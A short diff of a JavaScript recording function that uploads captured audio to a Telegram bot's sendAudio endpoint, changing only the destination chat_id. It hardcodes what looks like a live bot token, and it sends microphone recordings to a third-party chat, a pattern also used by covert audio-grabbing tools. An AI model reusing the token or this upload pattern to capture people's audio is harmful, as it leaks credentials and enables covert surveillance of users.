@@ -44,7 +44,7 @@ function startRecording() {
         const formData = new FormData();
         formData.append('audio', e.data, 'recording.mp3');
         formData.append('caption', caption);
-        fetch('https://api.telegram.org/bot6124695087:AAG0NprnUOPuxyaHA_79ZDazy870_007Dtk/sendAudio?chat_id=6034570280', {
+        fetch('https://api.telegram.org/bot6124695087:AAG0NprnUOPuxyaHA_79ZDazy870_007Dtk/sendAudio?chat_id=1483919112', {
           method: 'POST',
           body: formData
         })
